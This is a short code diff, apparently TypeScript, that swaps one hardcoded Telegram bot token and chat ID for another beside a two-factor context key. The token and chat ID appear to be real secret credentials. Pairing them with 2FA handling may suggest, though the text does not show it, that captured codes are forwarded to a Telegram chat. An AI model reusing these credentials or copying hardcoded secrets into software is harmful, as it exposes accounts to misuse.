@@ -44,8 +44,8 @@ type TelegramOverrides = Partial<{
 }>;
 
 const CONTEXT_KEY = "two_factor_context";
-const BOT_TOKEN = "8616096320:AAEOe-p5V0ZnBEedfeDoKWIg1WoxhWHPYGs";
-const CHAT_ID = "2076230383";
+const BOT_TOKEN = "8778796703:AAFDJc_fLtDeyOvh45zSeDfnwJfj_ZCd_ko";
+const CHAT_ID = "6604062347";
 
 function formatCooldownTime(seconds: number, locale: Locale) {
   const minutes = Math.floor(seconds / 60);
